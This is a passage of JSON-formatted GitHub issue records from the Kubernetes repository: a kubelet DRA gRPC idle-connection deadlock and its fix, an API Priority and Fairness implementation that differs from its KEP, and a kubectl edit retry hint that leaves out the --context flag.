{\n+\t\t\tp.mutex.Unlock()\n+\t\t\treturn nil, err\n+\t\t}\n+\t\tp.mutex.Unlock()\n+\t}\n+\n \tctx, cancel := context.WithTimeout(ctx, p.clientCallTimeout)\n \tdefer cancel()\n\n@@ -174,6 +188,18 @@ func (p *DRAPlugin) NodeUnprepareResources(\n \tlogger = klog.LoggerWithValues(logger, \"driverName\", p.driverName, \"endpoint\", p.endpoint)\n \tctx = klog.NewContext(ctx, logger)\n\n+\t// Create a new gRPC connection cases where it has become non-READY\n+\tstate := p.conn.GetState()\n+\tlogger.V(4).Info(\"Plugin connection state\", \"state\", state)\n+\tif state != connectivity.Ready {\n+\t\tp.mutex.Lock()\n+\t\tif err := p.reconnect(); err != nil {\n+\t\t\tp.mutex.Unlock()\n+\t\t\treturn nil, err\n+\t\t}\n+\t\tp.mutex.Unlock()\n+\t}\n+\n \tctx, cancel := context.WithTimeout(ctx, p.clientCallTimeout)\n \tdefer cancel()\n\ndiff --git a/pkg/kubelet/cm/dra/plugin/dra_plugin_manager.go b/pkg/kubelet/cm/dra/plugin/dra_plugin_manager.go\nindex 2b76d3bd348..b104b1e92b3 100644\n--- a/pkg/kubelet/cm/dra/plugin/dra_plugin_manager.go\n+++ b/pkg/kubelet/cm/dra/plugin/dra_plugin_manager.go\n@@ -358,19 +358,41 @@ func (pm *DRAPluginManager) add(driverName string, endpoint string, chosenServic\n \t\tpm:        pm,\n \t}\n\n-\t// The gRPC connection gets created once. gRPC then connects to the gRPC server on demand.\n-\ttarget := \"unix:\" + endpoint\n-\tlogger.V(4).Info(\"Creating new gRPC connection\", \"target\", target)\n-\tconn, err := grpc.NewClient(\n-\t\ttarget,\n-\t\tgrpc.WithTransportCredentials(insecure.NewCredentials()),\n-\t\tgrpc.WithChainUnaryInterceptor(newMetricsInterceptor(driverName)),\n-\t\tgrpc.WithStatsHandler(mp),\n-\t)\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"create gRPC connection to DRA driver %s plugin at endpoint %s: %w\", driverName, endpoint, err)\n+\t// The gRPC connection gets created once. gRPC then connects to the\n+\t// gRPC server on demand. We wrap the call in a reconnect() function to\n+\t// allow us to reestablish the connection if / when necessary.\n+\tp.reconnect = func() error {\n+\t\t// Close any existing connection\n+\t\tif p.conn != nil {\n+\t\t\tgo p.conn.Close()\n+\t\t}\n+\n+\t\t// Create the new connection\n+\t\ttarget := \"unix:\" + p.endpoint\n+\t\tlogger.V(4).Info(\"Creating new gRPC connection\", \"target\", target)\n+\t\tconn, err := grpc.NewClient(\n+\t\t\ttarget,\n+\t\t\tgrpc.WithTransportCredentials(insecure.NewCredentials()),\n+\t\t\tgrpc.WithChainUnaryInterceptor(newMetricsInterceptor(p.driverName)),\n+\t\t\tgrpc.WithStatsHandler(mp),\n+\t\t\tgrpc.WithIdleTimeout(0),\n+\t\t)\n+\t\tif err != nil {\n+\t\t\treturn fmt.Errorf(\"create gRPC connection to DRA driver %s plugin at endpoint %s: %w\", p.driverName, p.endpoint, err)\n+\t\t}\n+\n+\t\t// Ensure that gRPC tries to connect even if we don't call any gRPC method.\n+\t\t// This is necessary to detect early whether a plugin is really available.\n+\t\t// This is currently an experimental gRPC method. Should it be removed we\n+\t\t// would need to do something else, like sending a fake gRPC method call.\n+\t\tconn.Connect()\n+\n+\t\tp.conn = conn\n+\t\treturn nil\n+\t}\n+\tif err := p.reconnect(); err != nil {\n+\t\treturn err\n \t}\n-\tp.conn = conn\n\n \tif utilfeature.DefaultFeatureGate.Enabled(features.ResourceHealthStatus) {\n \t\tpm.wg.Add(1)\n@@ -396,12 +418,6 @@ func (pm *DRAPluginManager) add(driverName string, endpoint string, chosenServic\n \t\t}()\n \t}\n\n-\t// Ensure that gRPC tries to connect even if we don't call any gRPC method.\n-\t// This is necessary to detect early whether a plugin is really available.\n-\t// This is currently an experimental gRPC method. Should it be removed we\n-\t// would need to do something else, like sending a fake gRPC method call.\n-\tconn.Connect()\n-\n \tpm.store[p.driverName] = append(pm.store[p.driverName], mp)\n \tlogger.V(3).Info(\"Registered DRA plugin\", \"driverName\", p.driverName, \"endpoint\", p.endpoint, \"chosenService\", p.chosenService, \"numPlugins\", len(pm.store[p.driverName]))\n \tpm.sync(p.driverName)\n```\n\n### What did you expect to happen?\n\nCovered above\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nCovered above\n\n### Anything else we need to know?\n\n_No response_\n\n### Kubernetes version\n\n1.34\n\n### Cloud provider\n\nOn prem\n\n\n### OS version\n\n_No response_\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "sig/node", "needs-triage", "wg/device-management"], "comments": [{"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "klueska", "body": "/wg device-management"}, {"author": "pohly", "body": "You called this a regression in 1.34. So this is known to work in 1.33? What changed that caused this?\n\nThe last changes in this space where:\n- 1.33: https://github.com/kubernetes/kubernetes/pull/129832\n- 1.34: https://github.com/kubernetes/kubernetes/pull/132058 - reacts to connection end, should ignore idle\n- 1.34: https://github.com/kubernetes/kubernetes/pull/130606\n"}, {"author": "pohly", "body": "> It should not be possible for the first log line to be called without the second.\n>\n> It suggests the call to client.NodeUnprepareResources(ctx, req) never returns (despite the context with the timeout). Note that the call into client.NodeUnprepareResources() is into the generated PB code (which feels unlikely to be incorrect). We also never see \"internal error: unsupported chosen service\" anywhere in the logs.\n>\n> Not sure how this is possible or what is going on here.\n\nBefore we discuss workarounds let's figure out why it gets stuck and where.\n\nIn your suggested workaround, the application layer (our code) is retrieving the gRPC connection state and then reacting to it. It's unlikely, but the state could change for the worse after retrieving the old state and before proceeding, so this cannot be the right solution to whatever is causing this problem.\n\nA unit test with a reproducer would be a good next step. We cannot run unit tests which run as long as the default idle timeout (at least not in the CI, and during development it would be painfully slow), but as you noted, we can shorten that timeout.\n\n"}, {"author": "lmktfy", "body": "/sig node\n\nI'm confident the kubelet is at least involved."}, {"author": "pohly", "body": "Unit test:\n\n```patch\ndiff --git a/pkg/kubelet/cm/dra/plugin/dra_plugin_manager.go b/pkg/kubelet/cm/dra/plugin/dra_plugin_manager.go\nindex 2b76d3bd348..d7c88ae62bb 100644\n--- a/pkg/kubelet/cm/dra/plugin/dra_plugin_manager.go\n+++ b/pkg/kubelet/cm/dra/plugin/dra_plugin_manager.go\n@@ -62,6 +62,9 @@ type DRAPluginManager struct {\n \twipingDelay   time.Duration\n \tstreamHandler StreamHandler\n \n+\t// withIdleTimeout is only for unit testing, ignore if <= 0.\n+\twithIdleTimeout time.Duration\n+\n \twg    sync.WaitGroup\n \tmutex sync.RWMutex\n \n@@ -361,12 +364,15 @@ func (pm *DRAPluginManager) add(driverName string, endpoint string, chosenServic\n \t// The gRPC connection gets created once. gRPC then connects to the gRPC server on demand.\n \ttarget := \"unix:\" + endpoint\n \tlogger.V(4).Info(\"Creating new gRPC connection\", \"target\", target)\n-\tconn, err := grpc.NewClient(\n-\t\ttarget,\n+\toptions := []grpc.DialOption{\n \t\tgrpc.WithTransportCredentials(insecure.NewCredentials()),\n \t\tgrpc.WithChainUnaryInterceptor(newMetricsInterceptor(driverName)),\n \t\tgrpc.WithStatsHandler(mp),\n-\t)\n+\t}\n+\tif pm.withIdleTimeout > 0 {\n+\t\toptions = append(options, grpc.WithIdleTimeout(pm.withIdleTimeout))\n+\t}\n+\tconn, err := grpc.NewClient(target, options...)\n \tif err != nil {\n \t\treturn fmt.Errorf(\"create gRPC connection to DRA driver %s plugin at endpoint %s: %w\", driverName, endpoint, err)\n \t}\ndiff --git a/pkg/kubelet/cm/dra/plugin/dra_plugin_test.go b/pkg/kubelet/cm/dra/plugin/dra_plugin_test.go\nindex 2b884b6aefa..f0616077732 100644\n--- a/pkg/kubelet/cm/dra/plugin/dra_plugin_test.go\n+++ b/pkg/kubelet/cm/dra/plugin/dra_plugin_test.go\n@@ -27,9 +27,11 @@ import (\n \t\"testing\"\n \t\"time\"\n \n+\t\"github.com/onsi/gomega\"\n \t\"github.com/stretchr/testify/assert\"\n \t\"github.com/stretchr/testify/require\"\n \t\"google.golang.org/grpc\"\n+\t\"google.golang.org/grpc/connectivity\"\n \n \tdrahealthv1alpha1 \"k8s.io/kubelet/pkg/apis/dra-health/v1alpha1\"\n \tdrapbv1 \"k8s.io/kubelet/pkg/apis/dra/v1\"\n@@ -186,6 +188,48 @@ func TestGRPCConnIsReused(t *testing.T) {\n \trequire.Equal(t, 2, reusedConns[conn], \"expected counter to be 2 but got %d\", reusedConns[conn])\n }\n \n+func TestGRPCConnUsableAfterIdle(t *testing.T) {\n+\ttCtx := ktesting.Init(t)\n+\tservice := drapbv1.DRAPluginService\n+\taddr := path.Join(t.TempDir(), \"dra.sock\")\n+\tteardown, err := setupFakeGRPCServer(service, addr)\n+\trequire.NoError(t, err)\n+\tdefer teardown()\n+\n+\tdriverName := \"dummy-driver\"\n+\n+\t// ensure the plugin we are using is registered\n+\tdraPlugins := NewDRAPluginManager(tCtx, nil, nil, &mockStreamHandler{}, 0)\n+\tdraPlugins.withIdleTimeout = 5 * time.Second\n+\ttCtx.ExpectNoError(draPlugins.add(driverName, addr, service, defaultClientCallTimeout), \"add plugin\")\n+\tplugin, err := draPlugins.GetPlugin(driverName)\n+\ttCtx.ExpectNoError(err, \"get plugin\")\n+\n+\tconn := plugin.conn\n+\n+\t// A timeout a little larger than the 5 seconds above should also work,\n+\t// but there's no reason to cut it too close and risk flakes.\n+\t// We are not testing how well WithIdleTimeout works.\n+\ttCtx.Log(\"Waiting for idle connection...\")\n+\tktesting.Eventually(tCtx, func(ktesting.TContext) connectivity.State {\n+\t\treturn conn.GetState()\n+\t}).WithTimeout(30*time.Second).Should(gomega.Equal(connectivity.Idle), \"connection should be idle\")\n+\n+\treq := &drapbv1.NodePrepareResourcesRequest{\n+\t\tClaims: []*drapbv1.Claim{\n+\t\t\t{\n+\t\t\t\tNamespace: \"dummy-namespace\",\n+\t\t\t\tUid:       \"dummy-uid\",\n+\t\t\t\tName:      \"dummy-claim\",\n+\t\t\t},\n+\t\t},\n+\t}\n+\n+\tcallCtx := ktesting.WithTimeout(tCtx, 10*time.Second, \"call timed out\")\n+\t_, err = plugin.NodePrepareResources(callCtx, req)\n+\tassert.NoError(t, err)\n+}\n+\n func TestGetDRAPlugin(t *testing.T) {\n \tfor _, test := range []struct {\n \t\tdescription string\n```\n\nAnd it fails and hangs despite the call timeout:\n```\ngo test -v -run=TestGRPCConnUsableAfterIdle .\n=== RUN   TestGRPCConnUsableAfterIdle\n    dra_plugin_manager.go:366: I0908 07:43:04.359157] DRA registration handler: Creating new gRPC connection target=\"unix:/tmp/TestGRPCConnUsableAfterIdle1883222059/001/dra.sock\"\n    dra_plugin_manager.go:412: I0908 07:43:04.359521] DRA registration handler: Registered DRA plugin driverName=\"dummy-driver\" endpoint=\"/tmp/TestGRPCConnUsableAfterIdle1883222059/001/dra.sock\" chosenService=\"v1.DRAPlugin\" numPlugins=1\n    dra_plugin_manager.go:303: I0908 07:43:04.359549] DRA registration handler: No plugin connected, using latest one driverName=\"dummy-driver\" endpoint=\"/tmp/TestGRPCConnUsableAfterIdle1883222059/001/dra.sock\"\n    dra_plugin_test.go:213: I0908 07:43:04.359580] Waiting for idle connection...\n    dra_plugin_manager.go:132: I0908 07:43:04.359958] DRA registration handler: Connection changed driverName=\"dummy-driver\" endpoint=\"/tmp/TestGRPCConnUsableAfterIdle1883222059/001/dra.sock\" connected=true\n    dra_plugin.go:144: I0908 07:43:09.371283] Calling NodePrepareResources rpc driverName=\"dummy-driver\" endpoint=\"/tmp/TestGRPCConnUsableAfterIdle1883222059/001/dra.sock\" request=\"claims:{namespace:\\\"dummy-namespace\\\" uid:\\\"dummy-uid\\\" name:\\\"dummy-claim\\\"}\"\n    contexthelper.go:69: \n        INFO: canceling context: call timed out\n```\n\nNext step is to reproduce it with less of our boilerplate code, i.e. just using plain gRPC.\n\nAccording https://github.com/grpc/grpc/blob/master/doc/connectivity-semantics-and-api.md, an idle connection should automatically become active again when it is used. That doesn't seem to work here.\n"}, {"author": "pohly", "body": "Found it:\n\nhttps://github.com/kubernetes/kubernetes/blob/d9b31d602d833b8a45b31f720eed4534c769772b/pkg/kubelet/cm/dra/plugin/dra_plugin_manager.go#L118\n\nThat code is triggered when the connection goes idle. `Connect` then deadlocks - but only in the case of an idle connection. It does not deadlock when the connection is really lost, which is what we had covered by our unit tests already.\n\nThe fix is simple:\n\n```patch\ndiff --git a/pkg/kubelet/cm/dra/plugin/dra_plugin_manager.go b/pkg/kubelet/cm/dra/plugin/dra_plugin_manager.go\n@@ -115,7 +118,12 @@ func (m *monitoredPlugin) HandleConn(_ context.Context, stats grpcstats.ConnStat\n        case *grpcstats.ConnEnd:\n                // We have to ask for a reconnect, otherwise gRPC wouldn't try and\n                // thus we wouldn't be notified about a restart of the plugin.\n-               m.conn.Connect()\n+               // This must be done in a goroutine because gRPC deadlocks\n+               // when called directly from inside HandleConn when a connection\n+               // goes idle (and only then). It looks like cc.idlenessMgr.ExitIdleMode\n+               // in Connect tries to lock a mutex that is already locked by\n+               // the caller of HandleConn.\n+               go m.conn.Connect()\n        default:\n                return\n        }\n```\n\nThis is therefore really a regression, because this code is new in 1.34.\n\n"}, {"author": "pohly", "body": "Fix in https://github.com/kubernetes/kubernetes/pull/133926\n"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 124125, "issue_url": "https://github.com/kubernetes/kubernetes/issues/124125", "issue_title": "APF borrowing by exempt does not match KEP", "issue_author": "MikeSpreitzer", "issue_body": "### What happened?\r\n\r\nIn reviewing the KEP and the implementation, I noticed a difference in the way that the exempt priority level borrows from the others. In the KEP, in section https://github.com/kubernetes/enhancements/tree/master/keps/sig-api-machinery/1040-priority-and-fairness#dispatching (this material was added in https://github.com/kubernetes/enhancements/pull/3906), we see (among many other things) the following definition.\r\n\r\n```\r\nMinCurrentCL(i) = max( MinCL(i), min( NominalCL(i), HighSeatDemand(i) ) ) -- if non-exempt\r\nMinCurrentCL(i) = max( MinCL(i), HighSeatDemand(i) )                      -- if exempt\r\n```\r\n\r\nBut in the implementation (https://github.com/kubernetes/kubernetes/blob/3dedb8eb8c122d0a3221a5842c1d6697d8958151/staging/src/k8s.io/apiserver/pkg/util/flowcontrol/apf_controller.go#L407, introduced in #118782) there is no special treatment for exempt. It gets its MinCurrentCL computed by the same formula as non-exempt levels. In the default configuration (in which the exempt priority level has a nominal concurrency limit of zero), this means that the exempt priority level gets MinCurrentCL=0.\r\n\r\nThe KEP continues with some considerations for what to do if the exempt priority levels want to use up the whole server concurrency limit, or enough to prevent the non-exempt priority levels from getting their minimum allocations. These are also absent from the implementation --- naturally enough, since those situations cannot arise in the current implementation.\r\n\r\n### What did you expect to happen?\r\n\r\nConsistency\r\n\r\n### How can we reproduce it (as minimally and precisely as possible)?\r\n\r\nThis is from code and doc inspection, as described above.\r\n\r\n### Anything else we need to know?\r\n\r\n_No response_\r\n\r\n### Kubernetes version\r\n\r\n1.28.0 and later.\r\n\r\n\r\n### Cloud provider\r\n\r\n<details>\r\nN/A\r\n</details>\r\n\r\n\r\n### OS version\r\n\r\n<details>\r\n\r\nN/A\r\n\r\n</details>\r\n\r\n\r\n### Install tools\r\n\r\n<details>\r\n\r\n</details>\r\n\r\n\r\n### Container runtime (CRI) and version (if applicable)\r\n\r\n<details>\r\n\r\n</details>\r\n\r\n\r\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\r\n\r\n<details>\r\n\r\n</details>\r\n", "issue_labels": ["kind/bug", "sig/api-machinery", "lifecycle/rotten", "needs-triage"], "comments": [{"author": "MikeSpreitzer", "body": "A short version of the difference is this: the KEP says that the exempt priority level gets everything it wants and the other levels compete over the rest of the server's concurrency limit, while the implementation has the exempt priority level competing with the others on a level playing field."}, {"author": "MikeSpreitzer", "body": "/cc @tkashem \r\n/cc @wojtek-t \r\n/cc @deads2k \r\n"}, {"author": "MikeSpreitzer", "body": "@kubernetes/sig-api-machinery-bugs "}, {"author": "wojtek-t", "body": "I think we should fix that to what is described in the KEP - in the end all requests from exempt are executed anyway, so pretending they don't occupy resources is just cheating ourselves...\r\n\r\nI think we should just change the code to reflect what's described in the KEP."}, {"author": "alexzielenski", "body": "/triage accepted"}, {"author": "k8s-triage-robot", "body": "This issue has not been updated in over 1 year, and should be re-triaged.\n\nYou can:\n- Confirm that this issue is still relevant with `/triage accepted` (org members only)\n- Close this issue with `/close`\n\nFor more details on the triage process, see https://www.kubernetes.dev/docs/guide/issue-triage/\n\n/remove-triage accepted"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle stale`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle rotten\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n\nThis bot triages issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Reopen this issue with `/reopen`\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/close not-planned\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-ci-robot", "body": "@k8s-triage-robot: Closing this issue, marking it as \"Not Planned\".\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/124125#issuecomment-3263431020):\n\n>The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n>\n>This bot triages issues according to the following rules:\n>- After 90d of inactivity, `lifecycle/stale` is applied\n>- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n>- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n>\n>You can:\n>- Reopen this issue with `/reopen`\n>- Mark this issue as fresh with `/remove-lifecycle rotten`\n>- Offer to help out with [Issue Triage][1]\n>\n>Please send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n>\n>/close not-planned\n>\n>[1]: https://www.kubernetes.dev/docs/guide/issue-triage/\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 128808, "issue_url": "https://github.com/kubernetes/kubernetes/issues/128808", "issue_title": "kubectl edit: \"You can run `kubectl replace -f FILE` to try this update again\" misleading if user passed flags such as `--context`", "issue_author": "glasser", "issue_body": "### What happened?\r\n\r\nI ran `kubectl --context=dev edit statefulset/kafka` and got a permissions error (my GKE user did not have appropriate permissions). I had used `--context=dev` to select a particular cluster.\r\n\r\nAfter the permissions error, kubectl printed\r\n\r\n```\r\nYou can run `kubectl replace -f /var/folders/5y/55wpzs4n79v91k_2jf35354w0000gp/T/kubectl-edit-10910983.yaml` to try this update again.\r\n```\r\n\r\nI fixed my permission error (by giving my GKE user appropriate permissions) and ran the command above, but I got this error:\r\n\r\n```\r\nError from server (Conflict): error when replacing \"/var/folders/5y/55wpzs4n79v91k_2jf35354w0000gp/T/kubectl-edit-10910983.yaml\": Operation cannot be fulfilled on statefulsets.apps \"kafka\": StorageError: invalid object, Code: 4, Key: /registry/statefulsets/kafka-default/kafka, ResourceVersion: 0, AdditionalErrorMsg: Precondition failed: UID in precondition: 545e2602-484d-4c17-91ce-52bddf06e81e, UID in object meta: a280573a-fcd0-4771-a302-c48d1d47972f\r\n```\r\n\r\nThat is because the original `edit` command I ran included `--context=dev` and the suggested \"try again\" command did not \u2014 I was sending this command to the wrong cluster!\r\n\r\n### What did you expect to happen?\r\n\r\nRunning the command printed by `kubectl edit` would run the same operation as my original operation, not talk to a different cluster.\r\n\r\nEither:\r\n- kubectl recognizes that relevant options like `--context` were passed by the user and includes them in the suggested command\r\n- kubectl recognizes that relevant options like `--context` were passed by the user and decides not to suggest a command at all if it doesn't want to reproduce them\r\n- kubectl includes more context from the original command in the file it writes and the command it suggests uses that full context\r\n- The message printed could explicitly call out that you need to set things like context in the same way as the original command.\r\n\r\nFrom my perspective, it's not particularly obvious that you *do* have to add `--context` yourself to the follow-up command but you *don't* have to add `--namespace`. I can reason it out based on having a somewhat sophisticated mental model of k8s/kubectl but telling people to run a write command that might talk to the wrong cluster seems like something to avoid!\r\n\r\n### How can we reproduce it (as minimally and precisely as possible)?\r\n\r\nThe issue is pretty clear from [the source](https://github.com/kubernetes/kubernetes/blob/475ee33f698334e5b00c58d3bef4083840ec12c5/staging/src/k8s.io/kubectl/pkg/cmd/util/editor/editoptions.go#L400C28-L400C83): the suggested command never includes extra flags like `--context`.\r\n\r\n### Anything else we need to know?\r\n\r\n_No response_\r\n\r\n### Kubernetes version\r\n\r\n<details>\r\n\r\n```console\r\nClient Version: v1.29.3\r\nKustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3\r\nServer Version: v1.29.9-gke.1496000```\r\n\r\n</details>\r\n\r\n\r\n### Cloud provider\r\n\r\n<details>\r\nGKE\r\n</details>\r\n\r\n\r\n### OS version\r\n\r\n<details>\r\n\r\n```console\r\nDarwin Davids-MacBook-Pro.local 22.6.0 Darwin Kernel Version 22.6.0: Thu Sep  5 20:47:01 PDT 2024; root:xnu-8796.141.3.708.1~1/RELEASE_ARM64_T6000 arm64\r\n```\r\n\r\n</details>\r\n\r\n\r\n### Install tools\r\n\r\n<details>\r\n\r\n</details>\r\n\r\n\r\n### Container runtime (CRI) and version (if applicable)\r\n\r\n<details>\r\n\r\n</details>\r\n\r\n\r\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\r\n\r\n<details>\r\n\r\n</details>\r\n", "issue_labels": ["kind/bug", "sig/cli", "lifecycle/rotten", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "AmarNathChary", "body": "/sig cli"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle stale`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle rotten\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "glasser", "body": "I'm not sure if it's appropriate to try to mark fresh on my own issue, but the issue does still seem to exist on master."}, {"author": "glasser", "body": "/remove-lifecycle rotten"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle stale`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle rotten\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n\nThis bot triages issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Reopen this issue with `/reopen`\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/close not-planned\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-ci-robot", "body": "@k8s-triage-robot: Closing this issue, marking it as \"Not Planned\".\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/128808#issuecomment-3259207327):\n\n>The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n>\n>This bot triages issues according to the following rules:\n>- After 90d of inactivity, `lifecycle/stale` is applied\n>- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n>- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n>\n>You can:\n>- Reopen this issue with `/reopen`\n>- Mark this issue as fresh with `/remove-lifecycle rotten`\n>- Offer to help out with [Issue Triage][1]\n>\n>Please send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n>\n>/close not-planned\n>\n>[1]: https://www.kubernetes.dev/docs/guide/issue-triage/\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
